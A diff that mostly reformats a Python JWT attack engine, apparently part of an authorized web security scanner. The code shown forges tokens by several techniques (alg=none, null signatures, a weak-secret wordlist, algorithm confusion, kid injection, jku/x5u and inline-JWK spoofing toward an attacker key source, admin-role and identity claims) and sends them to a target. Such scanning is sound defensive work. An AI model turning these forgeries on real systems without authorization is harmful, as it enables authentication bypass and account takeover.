@@ -43,7 +43,7 @@ import json
 import time
 import uuid
 from datetime import datetime
-from typing import Any, Optional
+from typing import Any
 from urllib.parse import urlparse
 
 from core.config import Severity
@@ -193,33 +193,35 @@ def _category_specific_evidence(attack_result: AttackResult, category: str) -> l
     token = attack_result.jwt_token or ""
     try:
         decoded = decode_jwt(token)
-        header = decoded.get('header', {}) or {}
-        payload = decoded.get('payload', {}) or {}
+        header = decoded.get("header", {}) or {}
+        payload = decoded.get("payload", {}) or {}
     except Exception:
         return []
 
     if category in (JWT_BLANK_SECRET_CATEGORY, "JWT_WEAK_SECRET"):
-        alg = header.get('alg', 'unknown')
+        alg = header.get("alg", "unknown")
         if category == JWT_BLANK_SECRET_CATEGORY:
-            return [f"Blank-secret acceptance: token forged and verified under "
-                    f"the empty key with matching algorithm {alg}."]
+            return [
+                f"Blank-secret acceptance: token forged and verified under "
+                f"the empty key with matching algorithm {alg}."
+            ]
         return [f"Weak-secret acceptance: token forged with matching algorithm {alg}."]
 
     if category == "JWT_PSYCHIC_SIGNATURE":
-        alg = header.get('alg', 'unknown')
+        alg = header.get("alg", "unknown")
         return [f"Psychic signature (null r==s==0) accepted for ECDSA algorithm {alg}."]
 
     if category == "JWT_TIMESTAMP_TAMPERING_ACCEPTED":
-        time_claims = {c: payload[c] for c in ('exp', 'nbf', 'iat') if c in payload}
+        time_claims = {c: payload[c] for c in ("exp", "nbf", "iat") if c in payload}
         if time_claims:
             rendered = ", ".join(f"{c}={v}" for c, v in time_claims.items())
             return [f"Timestamp tampering accepted: tampered time claim(s) {rendered}."]
-        return ["Timestamp tampering accepted: a token a correct verifier should "
-                "reject was accepted."]
+        return [
+            "Timestamp tampering accepted: a token a correct verifier should reject was accepted."
+        ]
 
     if category == "JWT_CLAIM_FUZZING_ACCEPTED":
-        return ["Claim fuzzing accepted: a fuzzed claim/header value was accepted "
-                "by the target."]
+        return ["Claim fuzzing accepted: a fuzzed claim/header value was accepted by the target."]
 
     return []
 
@@ -289,9 +291,19 @@ def jwt_assessment_to_finding(attack_result: AttackResult, scan_id: str) -> Find
 # does not supply its own wordlist. Mirrors the fallback list used by
 # ``modules/owasp/auth_testing.py`` so the vocabulary is uniform.
 DEFAULT_WEAK_SECRETS: list[str] = [
-    "secret", "password", "123456", "admin", "test", "key",
-    "jwt", "token", "your-256-bit-secret", "your-secret-key",
-    "changeme", "secretkey", "supersecret",
+    "secret",
+    "password",
+    "123456",
+    "admin",
+    "test",
+    "key",
+    "jwt",
+    "token",
+    "your-256-bit-secret",
+    "your-secret-key",
+    "changeme",
+    "secretkey",
+    "supersecret",
 ]
 
 # kid injection payloads (path traversal, injection, SSRF, encoding tricks).
@@ -365,10 +377,10 @@ _INLINE_JWKS: list[dict] = [
         "use": "sig",
         "kid": "malicious-rsa-key",
         "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7a"
-             "PFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArw"
-             "l93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0z"
-             "gdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2Nc"
-             "Rwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
+        "PFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArw"
+        "l93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0z"
+        "gdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2Nc"
+        "Rwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
         "e": "AQAB",
         "alg": "RS256",
     },
@@ -442,17 +454,22 @@ class JWTAttackEngine:
             (Req 67.5).
     """
 
-    def __init__(self, target_url: str, original_token: str, http_engine,
-                 signing_secret: str | None = None,
-                 public_key_material: str | None = None,
-                 safe_mode: bool = False,
-                 custom_headers: dict[str, str] | None = None,
-                 post_data: str | None = None,
-                 method: str | None = None,
-                 weak_secrets: list[str] | None = None,
-                 fuzz_target: str | None = None,
-                 fuzz_values: list[str] | None = None,
-                 canary_value: str | None = None):
+    def __init__(
+        self,
+        target_url: str,
+        original_token: str,
+        http_engine,
+        signing_secret: str | None = None,
+        public_key_material: str | None = None,
+        safe_mode: bool = False,
+        custom_headers: dict[str, str] | None = None,
+        post_data: str | None = None,
+        method: str | None = None,
+        weak_secrets: list[str] | None = None,
+        fuzz_target: str | None = None,
+        fuzz_values: list[str] | None = None,
+        canary_value: str | None = None,
+    ):
         self.target_url = target_url
         self.original_token = original_token
         self.http_engine = http_engine
@@ -492,11 +509,13 @@ class JWTAttackEngine:
             self.logger.error("Invalid JWT token provided", error=str(e))
             raise ValueError(f"Invalid JWT token: {str(e)}") from e
 
-        self.logger.info("JWT Attack Engine initialized",
-                         target_url=target_url,
-                         algorithm=self.decoded_token['header'].get('alg', 'unknown'),
-                         safe_mode=safe_mode,
-                         has_signing_secret=bool(signing_secret))
+        self.logger.info(
+            "JWT Attack Engine initialized",
+            target_url=target_url,
+            algorithm=self.decoded_token["header"].get("alg", "unknown"),
+            safe_mode=safe_mode,
+            has_signing_secret=bool(signing_secret),
+        )
 
     # ------------------------------------------------------------------
     # Signing-key resolution
@@ -511,18 +530,18 @@ class JWTAttackEngine:
         return self.signing_secret if self.signing_secret else "secret"
 
     def _base_header(self) -> dict:
-        return copy.deepcopy(self.decoded_token['header'])
+        return copy.deepcopy(self.decoded_token["header"])
 
     def _base_payload(self) -> dict:
-        return copy.deepcopy(self.decoded_token['payload'])
+        return copy.deepcopy(self.decoded_token["payload"])
 
     @staticmethod
     def _encode_unsigned(header: dict, payload: dict) -> str:
         """Encode ``header.payload.`` with an empty signature segment."""
-        header_encoded = base64url_encode(
-            json.dumps(header, separators=(',', ':')).encode('utf-8'))
+        header_encoded = base64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
         payload_encoded = base64url_encode(
-            json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+            json.dumps(payload, separators=(",", ":")).encode("utf-8")
+        )
         return f"{header_encoded}.{payload_encoded}."
 
     # ------------------------------------------------------------------
@@ -558,31 +577,33 @@ class JWTAttackEngine:
         try:
             tokens = [t for t in generator() if t]
         except Exception as e:
-            self.logger.error("Token generation failed",
-                              attack_type=attack_type.value, error=str(e))
+            self.logger.error(
+                "Token generation failed", attack_type=attack_type.value, error=str(e)
+            )
             return []
 
-        self.logger.debug("Generated attack tokens",
-                          attack_type=attack_type.value, count=len(tokens))
+        self.logger.debug(
+            "Generated attack tokens", attack_type=attack_type.value, count=len(tokens)
+        )
         return tokens
 
     def _generate_alg_none(self) -> list[str]:
         """ALG_NONE: set ``alg`` to ``none`` and drop the signature (no key)."""
         header = self._base_header()
-        header['alg'] = 'none'
+        header["alg"] = "none"
         payload = self._base_payload()
         unsigned = self._encode_unsigned(header, payload)
         # Both the trailing-dot and no-dot variants are exercised.
-        return [unsigned, unsigned.rstrip('.')]
+        return [unsigned, unsigned.rstrip(".")]
 
     def _generate_null_signature(self) -> list[str]:
         """NULL_SIGNATURE: original header/payload with null signatures (no key)."""
         header = self._base_header()
         payload = self._base_payload()
-        header_encoded = base64url_encode(
-            json.dumps(header, separators=(',', ':')).encode('utf-8'))
+        header_encoded = base64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
         payload_encoded = base64url_encode(
-            json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+            json.dumps(payload, separators=(",", ":")).encode("utf-8")
+        )
 
         null_signatures = [
             "",
@@ -610,8 +631,8 @@ class JWTAttackEngine:
         ``JWT_BLANK_SECRET_ACCEPTED`` category.
         """
         header = self._base_header()
-        header['alg'] = 'HS256'  # weak-secret forgery targets HMAC verification
-        header.setdefault('typ', 'JWT')
+        header["alg"] = "HS256"  # weak-secret forgery targets HMAC verification
+        header.setdefault("typ", "JWT")
         payload = self._base_payload()
 
         # Prepend the blank/empty-secret candidate, de-duplicating so a wordlist
@@ -623,8 +644,7 @@ class JWTAttackEngine:
             try:
                 tokens.append(encode_jwt(header, payload, secret))
             except Exception as e:
-                self.logger.debug("Weak-secret token encode failed",
-                                  secret=secret, error=str(e))
+                self.logger.debug("Weak-secret token encode failed", secret=secret, error=str(e))
         return tokens
 
     def _generate_algorithm_confusion(self) -> list[str]:
@@ -645,35 +665,39 @@ class JWTAttackEngine:
         """
         if not self.public_key_material:
             self.logger.info(
-                "Skipping algorithm-confusion generation; no public key material supplied")
+                "Skipping algorithm-confusion generation; no public key material supplied"
+            )
             return []
 
         variants = _public_key_variants(self.public_key_material)
         if not variants:
-            self.logger.info(
-                "No public-key representation derivable; skipping algorithm confusion")
+            self.logger.info("No public-key representation derivable; skipping algorithm confusion")
             return []
 
         header = self._base_header()
-        header['alg'] = 'HS256'  # switch RS*/ES* -> HS256 (the confusion step)
-        header.setdefault('typ', 'JWT')
+        header["alg"] = "HS256"  # switch RS*/ES* -> HS256 (the confusion step)
+        header.setdefault("typ", "JWT")
         payload = self._base_payload()
 
-        header_encoded = base64url_encode(
-            json.dumps(header, separators=(',', ':')).encode('utf-8'))
+        header_encoded = base64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
         payload_encoded = base64url_encode(
-            json.dumps(payload, separators=(',', ':')).encode('utf-8'))
+            json.dumps(payload, separators=(",", ":")).encode("utf-8")
+        )
         signing_input = f"{header_encoded}.{payload_encoded}"
 
         tokens: list[str] = []
         for representation_name, key_bytes in variants:
             try:
                 signature = hmac.new(
-                    key_bytes, signing_input.encode('utf-8'), hashlib.sha256).digest()
+                    key_bytes, signing_input.encode("utf-8"), hashlib.sha256
+                ).digest()
                 tokens.append(f"{signing_input}.{base64url_encode(signature)}")
             except Exception as e:
-                self.logger.debug("Algorithm-confusion token encode failed",
-                                  representation=representation_name, error=str(e))
+                self.logger.debug(
+                    "Algorithm-confusion token encode failed",
+                    representation=representation_name,
+                    error=str(e),
+                )
         return tokens
 
     def _generate_kid_injection(self) -> list[str]:
@@ -700,22 +724,22 @@ class JWTAttackEngine:
         # Group 1: injection probes signed with the operator/real key.
         for injection in _KID_INJECTION_PAYLOADS:
             header = self._base_header()
-            header['kid'] = injection
+            header["kid"] = injection
             try:
                 tokens.append(encode_jwt(header, payload, real_key))
             except Exception as e:
-                self.logger.debug("kid injection encode failed",
-                                  payload=injection, error=str(e))
+                self.logger.debug("kid injection encode failed", payload=injection, error=str(e))
 
         # Group 2: predictable/empty-key probes signed with the forced key.
         for injection, predictable_key in _KID_PREDICTABLE_KEY_PAYLOADS.items():
             header = self._base_header()
-            header['kid'] = injection
+            header["kid"] = injection
             try:
                 tokens.append(encode_jwt(header, payload, predictable_key))
             except Exception as e:
-                self.logger.debug("kid predictable-key encode failed",
-                                  payload=injection, error=str(e))
+                self.logger.debug(
+                    "kid predictable-key encode failed", payload=injection, error=str(e)
+                )
         return tokens
 
     def _generate_jwks_spoof(self) -> list[str]:
@@ -724,14 +748,15 @@ class JWTAttackEngine:
         payload = self._base_payload()
         tokens: list[str] = []
         for url in _JWKS_SPOOF_URLS:
-            for header_param in ('jku', 'x5u'):
+            for header_param in ("jku", "x5u"):
                 header = self._base_header()
                 header[header_param] = url
                 try:
                     tokens.append(encode_jwt(header, payload, key))
                 except Exception as e:
-                    self.logger.debug("jwks spoof encode failed",
-                                      url=url, param=header_param, error=str(e))
+                    self.logger.debug(
+                        "jwks spoof encode failed", url=url, param=header_param, error=str(e)
+                    )
         return tokens
 
     def _generate_inline_jwks(self) -> list[str]:
@@ -741,12 +766,13 @@ class JWTAttackEngine:
         tokens: list[str] = []
         for jwk in _INLINE_JWKS:
             header = self._base_header()
-            header['jwk'] = jwk
+            header["jwk"] = jwk
             try:
                 tokens.append(encode_jwt(header, payload, key))
             except Exception as e:
-                self.logger.debug("inline jwks encode failed",
-                                  kid=jwk.get('kid', 'unknown'), error=str(e))
+                self.logger.debug(
+                    "inline jwks encode failed", kid=jwk.get("kid", "unknown"), error=str(e)
+                )
         return tokens
 
     def _generate_privilege_escalation(self) -> list[str]:
@@ -754,9 +780,9 @@ class JWTAttackEngine:
         key = self._signing_key()
         header = self._base_header()
         payload = self._base_payload()
-        payload['role'] = 'admin'
-        payload['admin'] = True
-        payload['is_admin'] = True
+        payload["role"] = "admin"
+        payload["admin"] = True
+        payload["is_admin"] = True
         return [encode_jwt(header, payload, key)]
 
     def _generate_user_impersonation(self) -> list[str]:
@@ -764,14 +790,14 @@ class JWTAttackEngine:
         key = self._signing_key()
         header = self._base_header()
         payload = self._base_payload()
-        if 'sub' in payload:
-            payload['sub'] = 'admin'
-        if 'user_id' in payload:
-            payload['user_id'] = '1'
-        if 'username' in payload:
-            payload['username'] = 'admin'
+        if "sub" in payload:
+            payload["sub"] = "admin"
+        if "user_id" in payload:
+            payload["user_id"] = "1"
+        if "username" in payload:
+            payload["username"] = "admin"
         # Guarantee at least one changed identity claim even when none present.
-        payload.setdefault('sub', 'admin')
+        payload.setdefault("sub", "admin")
         return [encode_jwt(header, payload, key)]
 
     def _generate_expiration_bypass(self) -> list[str]:
@@ -779,8 +805,8 @@ class JWTAttackEngine:
         key = self._signing_key()
         header = self._base_header()
         payload = self._base_payload()
-        payload.pop('exp', None)
-        payload.pop('iat', None)
+        payload.pop("exp", None)
+        payload.pop("iat", None)
         return [encode_jwt(header, payload, key)]
 
     def _generate_psychic_signature(self) -> list[str]:
@@ -793,10 +819,10 @@ class JWTAttackEngine:
         when the base token's ``alg`` is an ECDSA_Algorithm (``ES256``/``ES384``/
         ``ES512``); returns ``[]`` for any non-ECDSA base token.
         """
-        alg = str(self._base_header().get('alg', '')).upper()
+        alg = str(self._base_header().get("alg", "")).upper()
         if alg not in ES_SIG_BYTES:
             return []
-        parts = self.original_token.split('.')
+        parts = self.original_token.split(".")
         if len(parts) != 3:
             return []
         return [f"{parts[0]}.{parts[1]}.{psychic_signature_segment(alg)}"]
@@ -820,17 +846,17 @@ class JWTAttackEngine:
         """
         key = self._signing_key()
         now = int(time.time())
-        past = now - 3600                    # one hour ago
+        past = now - 3600  # one hour ago
         far_future = now + 60 * 60 * 24 * 3650  # ~10 years ahead
-        future = now + 3600                  # one hour ahead
+        future = now + 3600  # one hour ahead
 
         # Each variant modifies only the single targeted time claim; every other
         # component is inherited from the untouched base header/payload.
         variants = [
-            ('exp', past),
-            ('exp', far_future),
-            ('nbf', future),
-            ('iat', future),
+            ("exp", past),
+            ("exp", far_future),
+            ("nbf", future),
+            ("iat", future),
         ]
 
         tokens: list[str] = []
@@ -841,8 +867,9 @@ class JWTAttackEngine:
             try:
                 tokens.append(encode_jwt(header, payload, key))
             except Exception as e:
-                self.logger.debug("timestamp tamper encode failed",
-                                  claim=claim, value=value, error=str(e))
+                self.logger.debug(
+                    "timestamp tamper encode failed", claim=claim, value=value, error=str(e)
+                )
         return tokens
 
     def _generate_claim_fuzzing(self) -> list[str]:
@@ -874,15 +901,17 @@ class JWTAttackEngine:
             try:
                 tokens.append(encode_jwt(header, payload, key))
             except Exception as e:
-                self.logger.debug("claim fuzzing encode failed",
-                                  fuzz_target=self.fuzz_target,
-                                  value=value, error=str(e))
+                self.logger.debug(
+                    "claim fuzzing encode failed",
+                    fuzz_target=self.fuzz_target,
+                    value=value,
+                    error=str(e),
+                )
         return tokens
 
     def generate_all_tokens(self) -> dict[AttackType, list[str]]:
         """Generate tokens for every ``AttackType`` (convenience helper)."""
-        return {attack_type: self.generate_token(attack_type)
-                for attack_type in AttackType}
+        return {attack_type: self.generate_token(attack_type) for attack_type in AttackType}
 
     # ------------------------------------------------------------------
     # Sensitive-data-in-payload inspection (Requirement 43)
@@ -900,8 +929,8 @@ class JWTAttackEngine:
         """
         if self._sensitivity_module is None:
             from modules.owasp.property_level_auth import PropertyLevelAuthModule
-            self._sensitivity_module = PropertyLevelAuthModule.__new__(
-                PropertyLevelAuthModule)
+
+            self._sensitivity_module = PropertyLevelAuthModule.__new__(PropertyLevelAuthModule)
         return self._sensitivity_module
 
     def _redactor(self):
@@ -914,6 +943,7 @@ class JWTAttackEngine:
         """
         if self._secret_redactor is None:
             from modules.owasp.bola_testing import BOLATestingModule
+
             self._secret_redactor = BOLATestingModule.__new__(BOLATestingModule)
         return self._secret_redactor
 
@@ -975,14 +1005,13 @@ class JWTAttackEngine:
             redacted_snippet = ""
             redacted_value = redactor.REDACTION_MARKER
 
-        marker = getattr(redactor, 'REDACTION_MARKER', '<redacted>')
+        marker = getattr(redactor, "REDACTION_MARKER", "<redacted>")
         # Guarantee the raw value never survives verbatim in the output.
         if raw and (raw in redacted_value or raw in redacted_snippet):
             return marker
         return redacted_value
 
-    def inspect_payload_sensitivity(self, token: str,
-                                    scan_id: str = "") -> list[Finding]:
+    def inspect_payload_sensitivity(self, token: str, scan_id: str = "") -> list[Finding]:
         """Inspect a JWT payload for sensitive claims (Requirement 43).
 
         Decodes the payload and inspects each claim for sensitive data —
@@ -1006,10 +1035,11 @@ class JWTAttackEngine:
         """
         try:
             decoded = decode_jwt(token)
-            payload = decoded.get('payload')
+            payload = decoded.get("payload")
         except Exception as e:
-            self.logger.debug("Payload sensitivity inspection skipped; "
-                              "undecodable token", error=str(e))
+            self.logger.debug(
+                "Payload sensitivity inspection skipped; undecodable token", error=str(e)
+            )
             return []
 
         if not isinstance(payload, dict):
@@ -1022,39 +1052,43 @@ class JWTAttackEngine:
                 continue
 
             redacted_value = self._redact_claim_value(field, value)
-            findings.append(Finding(
-                id=str(uuid.uuid4()),
-                scan_id=scan_id,
-                category="JWT_SENSITIVE_DATA_IN_PAYLOAD",
-                owasp_category=JWT_OWASP_CATEGORY,
-                severity=Severity.MEDIUM,
-                endpoint=self.target_url,
-                method="ANALYSIS",
-                status_code=0,
-                response_size=0,
-                response_time=0.0,
-                evidence=(
-                    f"JWT payload claim '{field}' carries sensitive data "
-                    f"(sensitivity type: {sensitivity_type}). "
-                    f"Value (redacted): {redacted_value}"
-                ),
-                recommendation=(
-                    "Do not carry secrets or PII in JWT payload claims; the "
-                    "payload is only base64url-encoded, not encrypted. Move "
-                    "sensitive data server-side and reference it by an opaque id."
-                ),
-                payload=f"Field: {field}",
-            ))
-            self.logger.warning("Sensitive data detected in JWT payload",
-                                field=field, sensitivity_type=sensitivity_type)
+            findings.append(
+                Finding(
+                    id=str(uuid.uuid4()),
+                    scan_id=scan_id,
+                    category="JWT_SENSITIVE_DATA_IN_PAYLOAD",
+                    owasp_category=JWT_OWASP_CATEGORY,
+                    severity=Severity.MEDIUM,
+                    endpoint=self.target_url,
+                    method="ANALYSIS",
+                    status_code=0,
+                    response_size=0,
+                    response_time=0.0,
+                    evidence=(
+                        f"JWT payload claim '{field}' carries sensitive data "
+                        f"(sensitivity type: {sensitivity_type}). "
+                        f"Value (redacted): {redacted_value}"
+                    ),
+                    recommendation=(
+                        "Do not carry secrets or PII in JWT payload claims; the "
+                        "payload is only base64url-encoded, not encrypted. Move "
+                        "sensitive data server-side and reference it by an opaque id."
+                    ),
+                    payload=f"Field: {field}",
+                )
+            )
+            self.logger.warning(
+                "Sensitive data detected in JWT payload",
+                field=field,
+                sensitivity_type=sensitivity_type,
+            )
 
         return findings
 
     # ------------------------------------------------------------------
     # kid injection success confirmation (Requirement 44)
     # ------------------------------------------------------------------
-    async def _confirm_kid_injection(
-            self, attack_result: AttackResult | None) -> bool:
+    async def _confirm_kid_injection(self, attack_result: AttackResult | None) -> bool:
         """Confirm KID_Injection success via evidence (Requirement 44.2).
 
         Reuses the :class:`JWTAttackResponseAnalyzer` assessment carried on the
@@ -1098,16 +1132,16 @@ class JWTAttackEngine:
         attacker-signed token, so acceptance is unambiguous proof of the
         vulnerability (Requirement 45.2).
         """
-        if header_field not in ('jku', 'x5u'):
+        if header_field not in ("jku", "x5u"):
             raise ValueError("header_field must be 'jku' or 'x5u'")
         header = self._base_header()
         header[header_field] = key_source_url
         payload = self._base_payload()
         return encode_jwt(header, payload, _ATTACKER_KEY_SOURCE_SECRET)
 
-    def _assess_key_source_allowlist(self, header_field: str, key_source_url: str,
-                                     accepted: bool,
-                                     outbound_observed: bool) -> dict[str, Any]:
+    def _assess_key_source_allowlist(
+        self, header_field: str, key_source_url: str, accepted: bool, outbound_observed: bool
+    ) -> dict[str, Any]:
         """Assess whether the jku/x5u key-source domain is constrained by an allowlist.
 
         Reports whether the attacker-controlled key-source domain appears
@@ -1166,16 +1200,24 @@ class JWTAttackEngine:
                 result = await result
             return bool(result)
         except Exception as e:
-            self.logger.debug("Key-source observer failed",
-                              key_source_url=key_source_url, error=str(e))
+            self.logger.debug(
+                "Key-source observer failed", key_source_url=key_source_url, error=str(e)
+            )
             return False
 
-    def _build_jku_ssrf_finding(self, *, header_field: str, key_source_url: str,
-                                token: str, accepted: bool, outbound_observed: bool,
-                                assessment: VulnerabilityAssessment | None,
-                                response_details: ResponseDetails | None,
-                                allowlist: dict[str, Any],
-                                scan_id: str) -> Finding:
+    def _build_jku_ssrf_finding(
+        self,
+        *,
+        header_field: str,
+        key_source_url: str,
+        token: str,
+        accepted: bool,
+        outbound_observed: bool,
+        assessment: VulnerabilityAssessment | None,
+        response_details: ResponseDetails | None,
+        allowlist: dict[str, Any],
+        scan_id: str,
+    ) -> Finding:
         """Build the ``JWT_JKU_SSRF`` finding for a confirmed jku/x5u SSRF.
 
         Emitted only once confirmation is gated (Req 45.2 / 45.3). Evidence names
@@ -1254,9 +1296,9 @@ class JWTAttackEngine:
             payload=token_preview,
         )
 
-    async def test_key_source_ssrf(self, attacker_key_source_url: str,
-                                   key_source_observer=None,
-                                   scan_id: str = "") -> list[Finding]:
+    async def test_key_source_ssrf(
+        self, attacker_key_source_url: str, key_source_observer=None, scan_id: str = ""
+    ) -> list[Finding]:
         """Detect jku/x5u key-source SSRF (Requirement 45).
 
         Builds a token referencing ``attacker_key_source_url`` in the ``jku`` and
@@ -1293,7 +1335,7 @@ class JWTAttackEngine:
         method = self._resolve_method()
         findings: list[Finding] = []
 
-        for header_field in ('jku', 'x5u'):
+        for header_field in ("jku", "x5u"):
             token = self._build_jku_x5u_token(header_field, attacker_key_source_url)
 
             assessment: VulnerabilityAssessment | None = None
@@ -1304,8 +1346,9 @@ class JWTAttackEngine:
             except Exception as e:
                 # A failed key-source fetch/probe maps to "not vulnerable / no
                 # outbound observed" rather than crashing the scan.
-                self.logger.debug("jku/x5u SSRF request failed",
-                                  header_field=header_field, error=str(e))
+                self.logger.debug(
+                    "jku/x5u SSRF request failed", header_field=header_field, error=str(e)
+                )
                 response = None
 
             if response is not None:
@@ -1313,11 +1356,13 @@ class JWTAttackEngine:
                 # JWTAttackResponseAnalyzer is the single success detector
                 # (Req 19.1); JWKS_SPOOF is the closest attack semantics.
                 assessment = self.response_analyzer.analyze_attack_response(
-                    response_details, AttackType.JWKS_SPOOF)
+                    response_details, AttackType.JWKS_SPOOF
+                )
                 accepted = bool(assessment.is_vulnerable)
 
             outbound_observed = await self._observe_key_source(
-                key_source_observer, attacker_key_source_url)
+                key_source_observer, attacker_key_source_url
+            )
 
             # Confirm ONLY via attacker-signed-token acceptance OR an observed
             # outbound request; nothing else confirms a finding (Req 45.2/45.3).
@@ -1325,11 +1370,13 @@ class JWTAttackEngine:
                 self.logger.info(
                     "No jku/x5u SSRF confirmed for header field",
                     header_field=header_field,
-                    key_source_url=attacker_key_source_url)
+                    key_source_url=attacker_key_source_url,
+                )
                 continue
 
             allowlist = self._assess_key_source_allowlist(
-                header_field, attacker_key_source_url, accepted, outbound_observed)
+                header_field, attacker_key_source_url, accepted, outbound_observed
+            )
 
             self.logger.warning(
                 "jku/x5u key-source SSRF confirmed",
@@ -1337,19 +1384,22 @@ class JWTAttackEngine:
                 key_source_url=attacker_key_source_url,
                 accepted=accepted,
                 outbound_observed=outbound_observed,
-                allowlisted=allowlist["allowlisted"])
+                allowlisted=allowlist["allowlisted"],
+            )
 
-            findings.append(self._build_jku_ssrf_finding(
-                header_field=header_field,
-                key_source_url=attacker_key_source_url,
-                token=token,
-                accepted=accepted,
-                outbound_observed=outbound_observed,
-                assessment=assessment,
-                response_details=response_details,
-                allowlist=allowlist,
-                scan_id=scan_id,
-            ))
+            findings.append(
+                self._build_jku_ssrf_finding(
+                    header_field=header_field,
+                    key_source_url=attacker_key_source_url,
+                    token=token,
+                    accepted=accepted,
+                    outbound_observed=outbound_observed,
+                    assessment=assessment,
+                    response_details=response_details,
+                    allowlist=allowlist,
+                    scan_id=scan_id,
+                )
+            )
 
         return findings
 
@@ -1368,14 +1418,16 @@ class JWTAttackEngine:
         if self.safe_mode and method.upper() not in SAFE_METHODS:
             self.logger.info(
                 "Restricting JWT attack request to a safe method in safe mode",
-                requested_method=method, effective_method="GET")
+                requested_method=method,
+                effective_method="GET",
+            )
             return "GET"
         return method
 
     def _build_headers(self, token: str) -> dict[str, str]:
         headers = {
-            'Authorization': f'Bearer {token}',
-            'Accept': 'application/json',
+            "Authorization": f"Bearer {token}",
+            "Accept": "application/json",
         }
         headers.update(self.custom_headers)
         return headers
@@ -1383,23 +1435,23 @@ class JWTAttackEngine:
     async def _issue(self, token: str, method: str):
         """Issue a single request through the shared HTTPRequestEngine."""
         headers = self._build_headers(token)
-        kwargs: dict = {'headers': headers}
-        if self.post_data and method.upper() in ('POST', 'PUT', 'PATCH'):
+        kwargs: dict = {"headers": headers}
+        if self.post_data and method.upper() in ("POST", "PUT", "PATCH"):
             try:
-                kwargs['json'] = json.loads(self.post_data)
+                kwargs["json"] = json.loads(self.post_data)
             except (json.JSONDecodeError, ValueError):
-                kwargs['data'] = self.post_data
+                kwargs["data"] = self.post_data
         return await self.http_engine.request(method, self.target_url, **kwargs)
 
     @staticmethod
     def _to_response_details(response) -> ResponseDetails:
         """Adapt an ``HTTPRequestEngine`` Response into ``ResponseDetails``."""
-        content = getattr(response, 'content', b'') or b''
+        content = getattr(response, "content", b"") or b""
         return ResponseDetails(
-            status_code=getattr(response, 'status_code', 0),
-            headers=dict(getattr(response, 'headers', {}) or {}),
-            body=getattr(response, 'text', '') or '',
-            response_time=getattr(response, 'elapsed', 0.0) or 0.0,
+            status_code=getattr(response, "status_code", 0),
+            headers=dict(getattr(response, "headers", {}) or {}),
+            body=getattr(response, "text", "") or "",
+            response_time=getattr(response, "elapsed", 0.0) or 0.0,
             content_length=len(content),
         )
 
@@ -1408,11 +1460,11 @@ class JWTAttackEngine:
             return {}
         baseline = self.baseline_response.response_details
         return {
-            'status_code_diff': response_details.status_code - baseline.status_code,
-            'content_length_diff': response_details.content_length - baseline.content_length,
-            'response_time_diff': response_details.response_time - baseline.response_time,
-            'baseline_status': baseline.status_code,
-            'attack_status': response_details.status_code,
+            "status_code_diff": response_details.status_code - baseline.status_code,
+            "content_length_diff": response_details.content_length - baseline.content_length,
+            "response_time_diff": response_details.response_time - baseline.response_time,
+            "baseline_status": baseline.status_code,
+            "attack_status": response_details.status_code,
         }
 
     async def _establish_baseline(self) -> None:
@@ -1435,11 +1487,9 @@ class JWTAttackEngine:
         )
         # JWTAttackResponseAnalyzer is the single success detector (Req 19.1).
         self.response_analyzer = JWTAttackResponseAnalyzer(self.baseline_response)
-        self.logger.info("Baseline established",
-                         status_code=response_details.status_code)
+        self.logger.info("Baseline established", status_code=response_details.status_code)
 
-    def _attack_succeeded(self, assessment: VulnerabilityAssessment | None,
-                          response_body) -> bool:
+    def _attack_succeeded(self, assessment: VulnerabilityAssessment | None, response_body) -> bool:
         """Decide whether an attack variant succeeded (Reqs 67.3-67.5).
 
         The analyzer's ``is_vulnerable`` flag is the SOLE determinant of
@@ -1466,10 +1516,7 @@ class JWTAttackEngine:
 
         canary = self.canary_value
         if canary and isinstance(response_body, str) and canary in response_body:
-            corroboration = (
-                f"Canary value '{canary}' present in response — "
-                "corroborates success."
-            )
+            corroboration = f"Canary value '{canary}' present in response — corroborates success."
             # Append idempotently so repeated calls do not duplicate evidence.
             if corroboration not in assessment.evidence:
                 assessment.evidence.append(corroboration)
@@ -1488,8 +1535,7 @@ class JWTAttackEngine:
 
         tokens = self.generate_token(attack_type)
         if not tokens:
-            self.logger.warning("No attack tokens generated",
-                                attack_type=attack_type.value)
+            self.logger.warning("No attack tokens generated", attack_type=attack_type.value)
             return None
 
         method = self._resolve_method()
@@ -1499,13 +1545,15 @@ class JWTAttackEngine:
             try:
                 response = await self._issue(token, method)
             except Exception as e:
-                self.logger.debug("Attack request failed",
-                                  attack_type=attack_type.value, error=str(e))
+                self.logger.debug(
+                    "Attack request failed", attack_type=attack_type.value, error=str(e)
+                )
                 continue
 
             response_details = self._to_response_details(response)
             assessment = self.response_analyzer.analyze_attack_response(
-                response_details, attack_type)
+                response_details, attack_type
+            )
 
             result = AttackResult(
                 attack_type=attack_type,
@@ -1540,8 +1588,9 @@ class JWTAttackEngine:
             try:
                 result = await self.execute_attack(attack_type)
             except Exception as e:
-                self.logger.error("Attack vector failed",
-                                  attack_type=attack_type.value, error=str(e))
+                self.logger.error(
+                    "Attack vector failed", attack_type=attack_type.value, error=str(e)
+                )
                 continue
 
             if result is None:
@@ -1556,10 +1605,12 @@ class JWTAttackEngine:
         self.session.attack_results = self.attack_results
         summary = self._generate_summary()
 
-        self.logger.info("JWT attack execution completed",
-                         total_attacks=self.session.total_attacks,
-                         successful_attacks=self.session.successful_attacks,
